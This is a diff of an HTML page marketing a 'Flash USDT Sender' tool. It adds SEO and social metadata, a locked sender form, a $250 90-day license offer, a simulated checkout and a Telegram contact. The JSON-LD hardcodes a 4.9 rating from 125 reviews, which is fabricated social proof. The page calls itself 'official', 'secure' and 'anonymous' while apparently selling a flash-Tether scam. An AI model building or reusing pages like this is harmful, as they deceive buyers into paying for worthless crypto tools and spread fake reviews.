@@ -3,30 +3,192 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash USDT Sender</title>
-    <meta property="og:title" content="Flash USDT Sender">
-    <meta property="og:description" content="A quick and secure way to send USDT to any Ethereum address.">
+
+    <!-- SEO Meta Tags -->
+    <title>Flash USDT Sender - Secure & Instant Crypto Transfers</title>
+    <meta name="description" content="The official Flash USDT Sender software for quick and secure crypto transfers. Compatible with multiple platforms, enjoy fast transactions with our Web3 integrated tool.">
+    <meta name="keywords" content="Flash USDT, USDT Sender, crypto transfer, secure crypto, USDT transaction, Web3, MetaMask, blockchain">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" type="image/png">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://flash-usdt-sender-official.netlify.app/">
+    <meta property="og:title" content="Flash USDT Sender - Secure & Instant Crypto Transfers">
+    <meta property="og:description" content="The official Flash USDT Sender software for quick and secure crypto transfers.">
     <meta property="og:image" content="https://public.bnbstatic.com/image/cms/blog/20210601/3dfb073b-fb58-44b1-8041-2126bd851063.png">
-    <meta property="og:url" content="">
-    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://flash-usdt-sender-official.netlify.app/">
+    <meta property="twitter:title" content="Flash USDT Sender - Secure & Instant Crypto Transfers">
+    <meta property="twitter:description" content="The official Flash USDT Sender software for quick and secure crypto transfers.">
+    <meta property="twitter:image" content="https://public.bnbstatic.com/image/cms/blog/20210601/3dfb073b-fb58-44b1-8041-2126bd851063.png">
+
+    <!-- Stylesheets and Fonts -->
     <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+    <!-- JSON-LD Structured Data -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "SoftwareApplication",
+      "name": "Flash USDT Sender",
+      "applicationCategory": "FinancialApplication",
+      "operatingSystem": "Web",
+      "description": "A secure and fast web application for sending USDT (Tether) to any Ethereum address using Web3 technology.",
+      "offers": {
+        "@type": "Offer",
+        "price": "250.00",
+        "priceCurrency": "USD",
+        "description": "90-day license for full access to the Flash USDT Sender application."
+      },
+      "url": "https://flash-usdt-sender-official.netlify.app/",
+      "screenshot": "https://public.bnbstatic.com/image/cms/blog/20210601/3dfb073b-fb58-44b1-8041-2126bd851063.png",
+      "aggregateRating": {
+        "@type": "AggregateRating",
+        "ratingValue": "4.9",
+        "reviewCount": "125"
+      },
+      "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https://flash-usdt-sender-official.netlify.app/"
+      }
+    }
+    </script>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="logo">
-        <h1>Flash USDT Sender</h1>
-        <button id="connectWallet">Connect Wallet</button>
-        <div id="senderInfo" class="hidden">
-            <p>Your address: <span id="userAddress"></span></p>
-            <p>USDT balance: <span id="usdtBalance"></span></p>
+    <header>
+        <nav>
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="logo">
+                <span>Flash USDT Sender</span>
+            </div>
+            <ul>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#how-it-works">How It Works</a></li>
+                <li><a href="#pricing">Pricing</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section id="hero">
+            <h1>Instant & Secure USDT Transfers</h1>
+            <p>Your reliable solution for sending Tether (USDT) across the blockchain, fast and securely.</p>
+            <button class="cta-button" id="get-access-hero">Get Access Now!</button>
+        </section>
+
+        <section id="app-section">
+            <div id="app-container" class="locked">
+                <div id="lock-overlay">
+                    <i class="fas fa-lock"></i>
+                    <h2>Get Access to Use the Sender</h2>
+                    <p>Purchase a license to unlock the Flash USDT Sender functionality.</p>
+                    <button class="cta-button" id="get-access-overlay">Purchase License</button>
+                </div>
+                <div id="sender-tool">
+                    <h2>Flash USDT Sender</h2>
+                    <button id="connectWallet">Connect Wallet</button>
+                    <div id="senderInfo" class="hidden">
+                        <p>Your address: <span id="userAddress"></span></p>
+                        <p>USDT balance: <span id="usdtBalance"></span></p>
+                    </div>
+                    <div id="sendForm" class="hidden">
+                        <input type="text" id="recipientAddress" placeholder="Recipient Address" required>
+                        <input type="text" id="sendAmount" placeholder="Amount to send" required>
+                        <button id="sendButton">Send USDT</button>
+                    </div>
+                    <p id="transactionStatus"></p>
+                </div>
+            </div>
+        </section>
+
+        <section id="features">
+            <h2>Why Choose Us?</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Secure Transactions</h3>
+                    <p>Leverage the power of Web3 and your own wallet for maximum security. Your keys never leave your device.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-bolt"></i>
+                    <h3>Lightning Fast</h3>
+                    <p>Our optimized process ensures your USDT transfers are sent to the blockchain without any delay.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-cogs"></i>
+                    <h3>Multi-Platform</h3>
+                    <p>Compatible with any browser that supports Web3 wallets like MetaMask, Trust Wallet, and more.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-headset"></i>
+                    <h3>24/7 Support</h3>
+                    <p>Our dedicated support team is available around the clock to assist you with any issues.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="how-it-works">
+            <h2>Get Started in 3 Simple Steps</h2>
+            <div class="steps-container">
+                <div class="step">
+                    <span>1</span>
+                    <h3>Get a License</h3>
+                    <p>Purchase a 90-day license to get full access to the sender.</p>
+                </div>
+                <div class="step">
+                    <span>2</span>
+                    <h3>Connect Your Wallet</h3>
+                    <p>Securely connect your MetaMask or other Web3 wallet.</p>
+                </div>
+                <div class="step">
+                    <span>3</span>
+                    <h3>Send USDT</h3>
+                    <p>Enter the recipient and amount, and confirm the transaction.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="pricing">
+            <h2>Unlock Full Power</h2>
+            <div class="pricing-card">
+                <h3>90-Day License</h3>
+                <p class="price">$250<span> USD</span></p>
+                <ul>
+                    <li><i class="fas fa-check-circle"></i> Full Access to All Features</li>
+                    <li><i class="fas fa-check-circle"></i> 90-Day Validity</li>
+                    <li><i class="fas fa-check-circle"></i> 24/7 Customer Support</li>
+                    <li><i class="fas fa-check-circle"></i> Secure & Anonymous</li>
+                </ul>
+                <button class="cta-button" id="get-access-pricing">Get Access Now!</button>
+            </div>
+        </section>
+    </main>
+
+    <div id="payment-modal" class="hidden">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <h2>Secure Checkout</h2>
+            <p>You are purchasing a 90-day license for Flash USDT Sender for $250 USD.</p>
+            <p><em>This is a simulated payment gateway. No real transaction will occur.</em></p>
+            <button id="confirm-payment-button" class="cta-button">Confirm Payment</button>
         </div>
-        <div id="sendForm" class="hidden">
-            <input type="text" id="recipientAddress" placeholder="Recipient Address" required>
-            <input type="text" id="sendAmount" placeholder="Amount to send" required>
-            <button id="sendButton">Send USDT</button>
-        </div>
-        <p id="transactionStatus"></p>
     </div>
+
+    <footer>
+        <div class="footer-content">
+            <p>Powered by <a href="https://t.me/RecentCoders" target="_blank">RecentCoders</a></p>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-telegram"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+                <a href="#"><i class="fab fa-discord"></i></a>
+            </div>
+            <p>&copy; 2024 Flash USDT Sender. All Rights Reserved.</p>
+        </div>
+    </footer>
+
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script src="app.js"></script>
 </body>
